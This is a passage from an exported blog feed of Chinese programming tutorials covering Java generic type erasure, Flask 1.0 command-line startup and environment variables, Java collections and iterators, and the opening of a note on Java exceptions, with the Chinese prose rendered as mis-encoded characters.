<p>java çš„æ³›å‹åªåœç•™åœ¨äº†ç¼–è¯‘å±‚ï¼Œç¼–è¯‘å™¨åœ¨ç¼–è¯‘å®Œæˆåï¼Œä¼šæŠŠæ³›å‹ä¿¡æ¯æ“¦é™¤ï¼Œç”¨ç¬¬ä¸€ä¸ªé™å®šç±»å‹æ¥æ›¿ä»£ï¼Œæ²¡æœ‰æŒ‡å®šé™å®šç±»å‹çš„æ³›å‹å‚æ•°åˆ™ç”¨ Object ç±»æ›¿ä»£ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æŒ‡å®šäº†æ³›å‹å‚æ•°çš„é™å®šç±»å‹</span></span><br><span class="line"><span class="keyword">public</span> &lt;T extends Comparable&gt; <span class="function"><span class="keyword">void</span> <span class="title">test1</span><span class="params">()</span> </span>&#123;...&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç»ç¼–è¯‘å™¨ç±»å‹æ“¦é™¤å</span></span><br><span class="line"><span class="keyword">public</span> &lt;Comparable&gt; <span class="function"><span class="keyword">void</span> <span class="title">test1</span><span class="params">()</span> </span>&#123;...&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ— é™å®šç±»å‹</span></span><br><span class="line"><span class="keyword">public</span> &lt;T&gt; <span class="function"><span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span> </span>&#123;...&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç»ç¼–è¯‘å™¨ç±»å‹æ“¦é™¤å</span></span><br><span class="line"><span class="keyword">public</span> &lt;Object&gt; <span class="function"><span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span> </span>&#123;...&#125;</span><br></pre></td></tr></table></figure>

<p>ç»è¿‡ç±»å‹æ“¦é™¤åï¼Œæ‹¥æœ‰ä¸åŒæ³›å‹å‚æ•°çš„æ³›å‹ç±»åœ¨è™šæ‹Ÿæœºçœ¼ä¸­å°±æ˜¯ä¸€æ ·çš„äº†ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Test&lt;String&gt; t1 = <span class="keyword">new</span> Test&lt;&gt;();</span><br><span class="line">Test&lt;Integer&gt; t2 = <span class="keyword">new</span> Test&lt;&gt;();</span><br><span class="line">t1.getClass() == t2.getClass(); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>java å…è®¸çˆ¶ç±»çš„å¼•ç”¨ç±»å‹æŒ‡å‘å­ç±»å®ä¾‹ï¼Œè€Œ Object[ ] æ˜¯ä»»ä½•æ•°ç»„çš„çˆ¶ç±»ï¼Œè¿™ä¸ªæ—¶å€™å¦‚æœæˆ‘ä»¬å¾€é‡Œé¢æ”¾ä¸åŒäºåŸå§‹æ•°æ®ç±»å‹ ä½†æ˜¯æ»¡è¶³åæ¥ä½¿ç”¨çš„çˆ¶ç±»ç±»å‹çš„è¯ï¼Œç¼–è¯‘ä¸ä¼šæœ‰é—®é¢˜ã€‚å¦‚æœæ˜¯æ™®é€šç±»ï¼Œè¿™æ ·åšä¹Ÿä¸ä¼šæœ‰ä»€ä¹ˆé—®é¢˜ï¼Œå› ä¸ºåœ¨è¿è¡Œæ—¶ä¼šæ£€æŸ¥åŠ å…¥æ•°ç»„çš„å¯¹è±¡çš„ç±»å‹ï¼Œæ‰€ä»¥ä¸‹é¢è¿™æ®µä»£ç è¿è¡Œæ—¶ä¼šæŠ¥é”™ ArrayStoreExceptionï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String[] s = <span class="keyword">new</span> String[<span class="number">10</span>];</span><br><span class="line">Object[] o = s; <span class="comment">// OK</span></span><br><span class="line">Integer i = <span class="keyword">new</span> Integer(<span class="number">2</span>);</span><br><span class="line">o[<span class="number">0</span>] = i; <span class="comment">// throws ArrayStoreException</span></span><br></pre></td></tr></table></figure>

<p>å¦‚æœå¯ä»¥åˆ›å»ºæ³›å‹æ•°ç»„ï¼Œé‚£ä¹ˆä¸€ä¸ª Object æ•°ç»„å¼•ç”¨ç±»å‹æŒ‡å‘è¿™ä¸ªæ³›å‹æ•°ç»„å®ä¾‹æ˜¯å¯è¡Œçš„ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Test&lt;String&gt;[] tarr = <span class="keyword">new</span> Test&lt;&gt;[<span class="number">10</span>]; <span class="comment">// å®é™…ä¸è¡Œï¼Œå‡è®¾å¯è¡Œ</span></span><br><span class="line">Object[] o = tarr;</span><br></pre></td></tr></table></figure>

<p>ç¼–è¯‘å™¨ç¼–è¯‘æ—¶ä¼šæ ¹æ®å¼•ç”¨ç±»å‹è¿›è¡Œç±»å‹æ£€æŸ¥ï¼Œæ‰€ä»¥ä»¥ä¸‹ä»£ç å¯ä»¥é€šè¿‡ç¼–è¯‘ã€‚åœ¨è¿è¡Œæ—¶ä¼šæ£€æŸ¥åŠ å…¥æ•°ç»„çš„å¯¹è±¡çš„ç±»å‹ï¼Œä½†ç”±äºç±»å‹æ“¦é™¤ï¼Œä¸åŒæ³›å‹å‚æ•°çš„æ³›å‹ç±»åœ¨è™šæ‹Ÿæœºçœ¼é‡Œæ˜¯ç±»å‹ç›¸åŒçš„ï¼Œé‚£ä¹ˆåœ¨è¿è¡Œæ—¶ä¸€ä¸ª Test<Integer> å®ä¾‹æˆåŠŸè¢«æ”¾è¿› Test<String>[ ] ä¸­äº†ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Test&lt;Integer&gt; t = <span class="keyword">new</span> Test&lt;&gt;();</span><br><span class="line">o[<span class="number">0</span>] = t;</span><br></pre></td></tr></table></figure>

<p>ä¸€ä¸ªä¸æ³›å‹æ•°ç»„ç±»å‹ä¸åŒçš„å®ä¾‹å¯ä»¥è¢«åŠ å…¥æ•°ç»„ä¸­è€Œ java æ— æ³•æ£€æµ‹åˆ°è¿™ä¸€é”™è¯¯ã€‚é‚£ä¹ˆå¾ˆæ˜¾ç„¶æ— æ³•ä¿è¯æ³›å‹æ•°ç»„å…ƒç´ ç±»å‹çš„ä¸€è‡´æ€§ï¼Œå…¶åæœä¸è¨€è€Œå–»ã€‚</p>
]]></content>
      <categories>
        <category>è¯­è¨€</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Flaskâ€”â€”å¯åŠ¨å§ï¼ŒFlaskï¼</title>
    <url>/2018/11/15/Flask%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>ä»¥å‰è™šæ‹Ÿç¯å¢ƒä¸»è¦é  virtualenvï¼Œ é…åˆ requirements.txt åšåˆ°ä¸€é”®å®‰è£…ä¾èµ–çš„æ•ˆæœã€‚ä½†æ˜¯ requirements.txt éœ€è¦æ‰‹åŠ¨ç®¡ç†åŒ…è®°å½•ï¼Œæ¯æ¬¡å®‰è£…æ–°çš„åŒ…ä¹‹åéƒ½è¦æ›´æ–°è¿™ä¸ªæ–‡ä»¶ï¼Œå¾ˆéº»çƒ¦ã€‚ç°åœ¨æœ‰äº†æ–°çš„å·¥å…· pipenvã€‚pipenv å°†è™šæ‹Ÿç¯å¢ƒé…ç½®ä¸ä¾èµ–åŒ…ç®¡ç†æ•´åˆåœ¨ä¸€èµ·ï¼Œå¹¶è‡ªåŠ¨è®°å½•ä¾èµ–åŒ…çš„å®‰è£…ã€æ›´æ–°ä¸å¸è½½ã€‚çœŸæ­£åšåˆ°äº†â€ä¸€é”®ä½¿ç”¨â€œã€‚pipenv çš„ç”¨æ³•å‚è€ƒ<a href="https://zhuanlan.zhihu.com/p/37581807">è¿™ç¯‡æ–‡ç« </a>ã€‚</p>
<span id="more"></span>

<h2 id="å¯åŠ¨Flask"><a href="#å¯åŠ¨Flask" class="headerlink" title="å¯åŠ¨Flask"></a>å¯åŠ¨Flask</h2><p>åœ¨ Flask æ›´æ–°åˆ°ç‰ˆæœ¬ 1.0 ä»¥åï¼Œä¸å†æ¨èä½¿ç”¨ä¸‹é¢çš„æ–¹å¼å¯åŠ¨ Flask</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">app.run()</span><br></pre></td></tr></table></figure>

<p>å–è€Œä»£ä¹‹çš„æ˜¯å‘½ä»¤</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flask run</span><br></pre></td></tr></table></figure>

<p>Flask æ ¹æ®ä»¥ä¸‹è§„åˆ™ä¼šè‡ªåŠ¨æ¢æµ‹ç¨‹åºå®ä¾‹ï¼š</p>
<ol>
<li>ä»å½“å‰ç›®å½•å¯»æ‰¾ app.py æˆ– wsgi.py æ¨¡å—ï¼Œå¹¶ä»ä¸­å¯»æ‰¾åä¸º app æˆ– application çš„å®ä¾‹</li>
<li>ä»ç¯å¢ƒå˜é‡ FLASK_APP å¯¹åº”çš„å€¼å¯»æ‰¾åä¸º app æˆ– application çš„å®ä¾‹</li>
</ol>
<p>ä¾‹å¦‚ï¼Œå¦‚æœ Flask å®ä¾‹ app ä½äº hello.pyï¼Œå°† FLASK_APP è®¾ä¸º helloï¼ŒFlask å°±ä¼šåœ¨å½“å‰ç›®å½•çš„ hello.py æ¨¡å—å¯»æ‰¾å®ä¾‹</p>
<p>Flask é»˜è®¤ä¸ºç”Ÿäº§æ¨¡å¼(production mode), é€šè¿‡ç¯å¢ƒå˜é‡ FLASK_ENV å¯ä»¥ä¿®æ”¹ä¸ºå¼€å‘æ¨¡å¼(debug mode)ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">FLASK_ENV = development</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨ â€“host ä¸ â€“port å‚æ•°å¯ä»¥ä¿®æ”¹ Flask è¿è¡Œä¸»æœºä¸ç«¯å£</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">flask run --host=0.0.0.0</span><br><span class="line">flask run --port=9000</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå¯ä»¥é€šè¿‡ç¯å¢ƒå˜é‡ FLASK_RUN_HOST ä¸ FLASK_RUN_PORT è®¾ç½®ã€‚</p>
<p>å¯ä»¥é€šè¿‡ <code>flask --help</code> æŸ¥çœ‹æ‰€æœ‰å¯ç”¨å‘½ä»¤</p>
<h2 id="ç®¡ç†ç¯å¢ƒå˜é‡"><a href="#ç®¡ç†ç¯å¢ƒå˜é‡" class="headerlink" title="ç®¡ç†ç¯å¢ƒå˜é‡"></a>ç®¡ç†ç¯å¢ƒå˜é‡</h2><p>å¦‚æœå®‰è£…äº† python-dotenv åŒ…ï¼Œ Flask ä¼šä» .env æ–‡ä»¶ å’Œ .flaskenv æ–‡ä»¶ä¸­åŠ è½½ç¯å¢ƒå˜é‡ã€‚æ­¤æ—¶ Flask åŠ è½½ç¯å¢ƒå˜é‡çš„ä¼˜å…ˆçº§æ˜¯ï¼šç³»ç»Ÿç¯å¢ƒå˜é‡ &gt; .env ä¸­çš„ç¯å¢ƒå˜é‡ &gt; .flaskenv ä¸­çš„ç¯å¢ƒå˜é‡</p>
<p>.env ç”¨äºå­˜æ”¾å…¬å¼€ç¯å¢ƒå˜é‡, å¦‚ FLAKS_APP, .flaskenv ç”¨äºå­˜æ”¾æ•æ„Ÿç¯å¢ƒå˜é‡å¦‚ Email è´¦å·å¯†ç ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">!# MyFlask/.env</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> è¿™æ˜¯æ³¨é‡Š</span></span><br><span class="line">FLASK_APP = hello</span><br></pre></td></tr></table></figure>

<h2 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h2><p>ç”¨å¦‚ä¸‹å‘½ä»¤å¯ä»¥å¯åŠ¨å¸¦æœ‰ä¸Šä¸‹æ–‡çš„ Python Shell ç¯å¢ƒï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">flask shell</span><br></pre></td></tr></table></figure>

<p>å’Œå…¶ä»– flask å‘½ä»¤ç›¸åŒï¼Œåœ¨æ‰§è¡Œè¿™ä¸ªå‘½ä»¤å‰è¦ç¡®ä¿ Flask å®ä¾‹å¯ä»¥è¢«æ‰¾åˆ°</p>
<h2 id="flask-å‘½ä»¤"><a href="#flask-å‘½ä»¤" class="headerlink" title="flask å‘½ä»¤"></a>flask å‘½ä»¤</h2><p>é€šè¿‡ä¸ºä¸€ä¸ªå‡½æ•°æ·»åŠ  @app.cli.command() è£…é¥°å™¨ï¼Œå¯ä»¥æ³¨å†Œä¸€ä¸ª flask å‘½ä»¤ã€‚å‡½æ•°çš„åç§°å³ä¸ºå‘½ä»¤åï¼Œä¹Ÿå¯ä»¥é€šè¿‡ç»™è£…é¥°å™¨ä¼ å‚çš„æ–¹å¼å‘½åï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.cli.command(<span class="params"><span class="string">&#x27;greet&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span>():</span></span><br><span class="line">    click.echo(<span class="string">&#x27;hello!&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>flask å‘½ä»¤æ˜¯é€šè¿‡ Click åŒ…å®ç°çš„ï¼Œæ›´å¤šå…³äºè‡ªå®šä¹‰å‘½ä»¤çš„è®¾ç½®å’ŒåŠŸèƒ½è¯·çœ‹<a href="http://click.pocoo.org/6/">Clickæ–‡æ¡£</a></p>
]]></content>
      <categories>
        <category>Webå¼€å‘</category>
      </categories>
      <tags>
        <tag>Flask</tag>
      </tags>
  </entry>
  <entry>
    <title>javaåŸºç¡€-ä½¿ç”¨é›†åˆç±»</title>
    <url>/2018/06/28/java%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1-%E9%9B%86%E5%90%88/</url>
    <content><![CDATA[<p>Javaé›†åˆç±»åº“å°†<code>æ¥å£ï¼ˆinterfaceï¼‰</code>ä¸<code>å®ç°ï¼ˆimplementationï¼‰</code>åˆ†ç¦»ã€‚åœ¨ä½¿ç”¨é›†åˆç±»æ—¶ï¼Œä¸€æ—¦æ„å»ºäº†é›†åˆå°±ä¸éœ€è¦çŸ¥é“ç©¶ç«Ÿä½¿ç”¨äº†å“ªç§å®ç°ï¼Œå› æ­¤åªæœ‰åœ¨æ„å»ºé›†åˆå¯¹è±¡æ—¶ä½¿ç”¨å…·ä½“çš„ç±»æ‰æœ‰æ„ä¹‰ã€‚å¯ä»¥ä½¿ç”¨<code>æ¥å£ç±»å‹</code>å­˜æ”¾é›†åˆçš„å¼•ç”¨ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Queue&lt;Customer&gt; expressLane = <span class="keyword">new</span> LinkedListQueue&lt;&gt;();</span><br><span class="line">expressLane.add(<span class="keyword">new</span> Customer(<span class="string">&quot;David&quot;</span>));</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·åšæœ‰åˆ©äºéšæ—¶æ›´æ”¹å®ç°ç±»å‹ï¼Œå½“å‘ç°æœ‰æ›´åˆé€‚çš„å®ç°ç±»æ—¶ï¼Œåªéœ€è¦ä¿®æ”¹è°ƒç”¨æ„é€ å™¨å¤„çš„ä»£ç å°±å¯ä»¥äº†ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Queue&lt;Customer&gt; expressLane = <span class="keyword">new</span> CirculArrayQueue&lt;&gt;(<span class="number">100</span>);</span><br></pre></td></tr></table></figure>

<p>é›†åˆç±»çš„åŸºæœ¬æ¥å£æ˜¯<code>Collectionæ¥å£</code>,è¿™ä¸ªæ¥å£æœ‰ä¸¤ä¸ªæ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Collection</span>&lt;<span class="title">E</span>&gt;</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">add</span><span class="params">(E element)</span></span>;</span><br><span class="line">    <span class="function">Iterator&lt;E&gt; <span class="title">iterator</span><span class="params">()</span></span>;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>addæ–¹æ³•ç”¨äºå‘é›†åˆä¸­æ·»åŠ å…ƒç´ ã€‚å¦‚æœæ·»åŠ æˆåŠŸè¿”å›trueï¼Œå¦åˆ™falseã€‚<br>iteratoræ–¹æ³•è¿”å›ä¸€ä¸ªå®ç°äº†Iteratoræ¥å£çš„å¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡åˆç§°ä¸º<code>è¿­ä»£å™¨</code>ï¼Œå¯ä»¥ç”¨è¿™ä¸ªè¿­ä»£å™¨ä¾æ¬¡è®¿é—®é›†åˆä¸­çš„å…ƒç´ </p>
<h2 id="è¿­ä»£å™¨"><a href="#è¿­ä»£å™¨" class="headerlink" title="è¿­ä»£å™¨"></a>è¿­ä»£å™¨</h2><p>Iteratoræ¥å£åŒ…å«4ä¸ªæ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Iterator</span>&lt;<span class="title">E</span>&gt;</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function">E <span class="title">next</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">hasNext</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">remove</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">default</span> <span class="keyword">void</span> <span class="title">forEachRemaining</span><span class="params">(Consumer&lt;? <span class="keyword">super</span> E&gt; action)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Javaè¿­ä»£å™¨çš„æŸ¥æ‰¾ä¸ä½ç½®å˜æ›´æ˜¯ç´§å¯†ç›¸è¿çš„ï¼ŒæŸ¥æ‰¾ä¸€ä¸ªå…ƒç´ çš„å”¯ä¸€æ–¹æ³•æ˜¯è°ƒç”¨<code>next()</code>ï¼Œè€Œåœ¨æ‰§è¡ŒæŸ¥æ‰¾æ“ä½œæ—¶ï¼Œè¿­ä»£å™¨çš„ä½ç½®éšä¹‹å‘å‰ç§»åŠ¨ã€‚å½“è°ƒç”¨<code>next()</code>æ—¶ï¼Œè¿­ä»£å™¨å°±è¶Šè¿‡ä¸‹ä¸€ä¸ªå…ƒç´ å¹¶è¿”å›åˆšåˆšè¶Šè¿‡çš„é‚£ä¸ªå…ƒç´ çš„å¼•ç”¨ã€‚è€Œ<code>remove()</code>ä¼šä»è¿­ä»£å™¨ä¸­åˆ é™¤ä¸Šæ¬¡è°ƒç”¨<code>next()</code>æ–¹æ³•æ—¶è¿”å›çš„å…ƒç´ ã€‚</p>
<p>è¿­ä»£å™¨åº”ç†è§£ä¸ºå¤„äºä¸¤ä¸ªå…ƒç´ ä¹‹é—´ï¼Œå½“è°ƒç”¨<code>next()</code>æ—¶ï¼Œè¿­ä»£å™¨å°±è¶Šè¿‡ä¸‹ä¸€ä¸ªå…ƒç´ å¹¶è¿”å›åˆšåˆšè¶Šè¿‡çš„é‚£ä¸ªå…ƒç´ çš„å¼•ç”¨ã€‚</p>
<h2 id="é“¾è¡¨"><a href="#é“¾è¡¨" class="headerlink" title="é“¾è¡¨"></a>é“¾è¡¨</h2><p>Javaä¸­æ‰€æœ‰é“¾è¡¨éƒ½æ˜¯åŒå‘çš„ã€‚å¯¹äºé“¾è¡¨ï¼Œå°½é‡ä¸ä½¿ç”¨éšæœºè®¿é—®è€Œä½¿ç”¨éå†æ“ä½œï¼Œå¦åˆ™æ•ˆç‡å¾ˆä½ã€‚Javaæä¾›äº†LinkedListç±»ï¼Œå¯ä»¥å¾ˆç®€å•å®ç°åˆ—è¡¨ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;String&gt; staff = <span class="keyword">new</span> LinkedList&lt;&gt;(); <span class="comment">// LinkedListç±»å®ç°äº†Listæ¥å£</span></span><br><span class="line">staff.add(<span class="string">&quot;Susan&quot;</span>);</span><br><span class="line">staff.add(<span class="string">&quot;David&quot;</span>);</span><br><span class="line">staff.add(<span class="string">&quot;Mike&quot;</span>);</span><br><span class="line">Iterator&lt;String&gt; iterator = staff.iterator();</span><br><span class="line">iterator.next();</span><br><span class="line">iterator.remove();</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡<code>add</code>æ–¹æ³•å¯ä»¥å‘é“¾è¡¨å°¾éƒ¨æ·»åŠ å…ƒç´ ã€‚æƒ³è¦åœ¨é“¾è¡¨ä¸­é—´æ’å…¥å…ƒç´ ï¼Œç”±äºè¿­ä»£å™¨æ˜¯è¡¨è¿°é›†åˆä¸­ä½ç½®çš„ï¼Œæ‰€ä»¥è¦å€ŸåŠ©è¿­ä»£å™¨å®ç°ï¼Œè€Œåªæœ‰åœ¨æœ‰åºé›†åˆä¸­è¿™æ ·åšæ‰æœ‰æ„ä¹‰ï¼ŒIteratoræ˜¯ä½¿ç”¨ä¸æ‰€æœ‰é›†åˆçš„ï¼Œæ‰€ä»¥å¯¹äºæœ‰åºé›†åˆï¼ŒJavaæä¾›äº†Iteratorçš„å­ç±»ListIteratorï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;String&gt; staff = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">staff.add(<span class="string">&quot;Susan&quot;</span>);</span><br><span class="line">staff.add(<span class="string">&quot;David&quot;</span>);</span><br><span class="line">ListIterator&lt;String&gt; iter = staff.ListIterator();</span><br><span class="line">iter.next();</span><br><span class="line">iter.add(<span class="string">&quot;Mike&quot;</span>); <span class="comment">// åœ¨Susanä¹‹åï¼ŒDavidä¹‹å‰æ·»åŠ Mike</span></span><br><span class="line">String first = iter.previous();  <span class="comment">// åå‘éå†é“¾è¡¨</span></span><br><span class="line">iter.remove(); <span class="comment">// åˆ é™¤è¢«previousè¶Šè¿‡çš„å…ƒç´ Mike</span></span><br></pre></td></tr></table></figure>

<p><code>set</code>æ–¹æ³•ç”¨äºæ›¿æ¢è¢«nextæˆ–previousè¶Šè¿‡çš„å…ƒç´ ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;String&gt; staff = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">staff.add(<span class="string">&quot;Susan&quot;</span>);</span><br><span class="line">staff.add(<span class="string">&quot;David&quot;</span>);</span><br><span class="line">staff.next();</span><br><span class="line">staff.set(<span class="string">&quot;Mike&quot;</span>); <span class="comment">// Susanè¢«æ›¿æ¢ä¸ºMike</span></span><br></pre></td></tr></table></figure>

<h2 id="æ³›å‹æ•°ç»„åˆ—è¡¨"><a href="#æ³›å‹æ•°ç»„åˆ—è¡¨" class="headerlink" title="æ³›å‹æ•°ç»„åˆ—è¡¨"></a>æ³›å‹æ•°ç»„åˆ—è¡¨</h2><p>åœ¨Javaä¸­ï¼Œå¯ä»¥ç”¨å˜é‡æ¥ç¡®å®šæ•°ç»„çš„å¤§å°ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Employee staff[] = <span class="keyword">new</span> Employee[num];</span><br></pre></td></tr></table></figure>

<p>ä¸ºäº†è¾¾åˆ°æ•°ç»„åŠ¨æ€å˜é•¿/ç¼©çŸ­çš„æ•ˆæœï¼Œä½¿ç”¨æ³›å‹æ•°ç»„åˆ—è¡¨<code>ArrayList</code>ã€‚<em>æ³›å‹</em>å³â€œå‚æ•°åŒ–ç±»å‹â€ã€å°†ç±»å‹å‚æ•°åŒ–ï¼Œç±»ä¼¼äºæ–¹æ³•ä¸­çš„å˜é‡å‚æ•°ï¼Œåªæ˜¯æ­¤æ—¶ç±»å‹ä¹Ÿå®šä¹‰æˆå‚æ•°å½¢å¼ï¼ˆåˆç§°ä¸ºç±»å‹å‚æ•°ï¼‰ã€‚ä¸ºäº†æŒ‡å®šæ•°ç»„åˆ—è¡¨ä¿å­˜çš„å…ƒç´ å¯¹è±¡ç±»å‹ï¼Œéœ€è¦ç”¨ä¸€å¯¹å°–æ‹¬å·å°†ç±»åæ‹¬èµ·æ¥åŠ åœ¨åé¢ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ArrayList&lt;Employee&gt; staff = <span class="keyword">new</span> ArrayList&lt;Employee&gt;();</span><br></pre></td></tr></table></figure>

<p>ç”¨<code>add([int index,]obj)</code>æ–¹æ³•å¾€æ•°ç»„åˆ—è¡¨æ·»åŠ å…ƒç´ ï¼Œä¸æŒ‡å®šç´¢å¼•åˆ™é»˜è®¤åŠ åˆ°æœ«å°¾ã€‚<code>remove(int index)</code>åˆ é™¤å…ƒç´ ï¼Œ<code>get(int index)</code>æŒ‰ç´¢å¼•è·å–å…ƒç´ ï¼Œ<code>set(int index, obj)</code>é‡ç½®å¯¹åº”ç´¢å¼•çš„å…ƒç´ ï¼ˆä¸èƒ½ç”¨äºæ·»åŠ å…ƒç´ ï¼‰ï¼Œ<code>size()</code>æ–¹æ³•è·å–ArrayListé•¿åº¦ã€‚</p>
<h2 id="æ³›å‹åŒ–ä¸åŸå§‹æ•°ç»„åˆ—è¡¨ä¹‹é—´çš„å…¼å®¹æ€§"><a href="#æ³›å‹åŒ–ä¸åŸå§‹æ•°ç»„åˆ—è¡¨ä¹‹é—´çš„å…¼å®¹æ€§" class="headerlink" title="æ³›å‹åŒ–ä¸åŸå§‹æ•°ç»„åˆ—è¡¨ä¹‹é—´çš„å…¼å®¹æ€§"></a>æ³›å‹åŒ–ä¸åŸå§‹æ•°ç»„åˆ—è¡¨ä¹‹é—´çš„å…¼å®¹æ€§</h2><p>åœ¨ç¼–è¯‘ä¹‹åç¨‹åºä¼šé‡‡å–å»æ³›å‹åŒ–çš„æªæ–½ï¼Œå³Java ä¸­çš„æ³›å‹åªåœ¨ç¼–è¯‘é˜¶æ®µæœ‰æ•ˆã€‚åœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­ï¼Œæ­£ç¡®æ£€éªŒæ³›å‹ç»“æœåï¼Œä¼šå°†æ³›å‹çš„ç›¸å…³ä¿¡æ¯æ“¦é™¤ï¼Œå¹¶ä¸”åœ¨å¯¹è±¡è¿›å…¥å’Œç¦»å¼€æ–¹æ³•çš„è¾¹ç•Œå¤„æ·»åŠ ç±»å‹æ£€æŸ¥å’Œç±»å‹è½¬æ¢çš„æ–¹æ³•ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ³›å‹ä¿¡æ¯ä¸ä¼šè¿›å…¥åˆ°è¿è¡Œæ—¶é˜¶æ®µã€‚</p>
<p>å¯¹æ­¤æ€»ç»“æˆä¸€å¥è¯ï¼šæ³›å‹ç±»å‹åœ¨é€»è¾‘ä¸Šçœ‹ä»¥çœ‹æˆæ˜¯å¤šä¸ªä¸åŒçš„ç±»å‹ï¼Œå®é™…ä¸Šéƒ½æ˜¯ç›¸åŒçš„åŸºæœ¬ç±»å‹ ArrayListã€‚</p>
]]></content>
      <categories>
        <category>è¯­è¨€</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaåŸºç¡€â€”å¤„ç†å¼‚å¸¸</title>
    <url>/2018/06/24/Java%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E2%80%94-%E5%A4%84%E7%90%86%E5%BC%82%E5%B8%B8/</url>
    <content><![CDATA[<p>å¤„ç†å¼‚å¸¸çš„ä»»åŠ¡å°±æ˜¯å°†æ§åˆ¶æƒä»é”™è¯¯äº§ç”Ÿçš„åœ°æ–¹è½¬ç§»ç»™èƒ½å¤Ÿå¤„ç†è¿™ç§æƒ…å†µçš„é”™è¯¯å¤„ç†å™¨ã€‚å¦‚æœæŸä¸ªæ–¹æ³•ä¸èƒ½é‡‡ç”¨æ­£å¸¸çš„é€”å¾„å®Œæˆä»–çš„ä»»åŠ¡ ï¼Œå°±å¯ä»¥é€šè¿‡å¦å¤–ä¸€ä¸ªè·¯å¾„é€€å‡ºæ–¹æ³•ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ–¹æ³•å¹¶ä¸èƒ½è¿”å›ä»»ä½•å€¼ï¼Œè€Œæ˜¯æŠ›å‡ºï¼ˆthrowï¼‰ä¸€ä¸ªå°è£…äº†é”™è¯¯ä¿¡æ¯çš„å¯¹è±¡ï¼Œç„¶åè¿™ä¸ªæ–¹æ³•ä¼šé€€å‡ºä¸”ä¸è¿”å›ä»»ä½•å€¼ã€‚</p>
<p>å¼‚å¸¸åˆåˆ†ä¸º<code>å—æŸ¥(check)å¼‚å¸¸</code>ä¸<code>éå—æŸ¥(uncheck)å¼‚å¸¸</code>ã€‚éå—æŸ¥å¼‚å¸¸åŒ…æ‹¬Errorç±»å¼‚å¸¸ä¸RuntimeExceptionç±»å¼‚å¸¸ï¼Œè¿™äº›å¼‚å¸¸éƒ½æ˜¯å› ä¸ºç¨‹åºæœ¬èº«è®¾è®¡ä¸åˆç†äº§ç”Ÿçš„ï¼Œå±äºé€»è¾‘å¼‚å¸¸ã€‚è€Œå—æŸ¥å¼‚å¸¸è¡¨ç¤ºå…¶ä»–å¼‚å¸¸ï¼Œå¦‚IOExceptionã€‚å¤„ç†å¼‚å¸¸æŒ‡çš„æ˜¯å¤„ç†å—æŸ¥å¼‚å¸¸ã€‚</p>
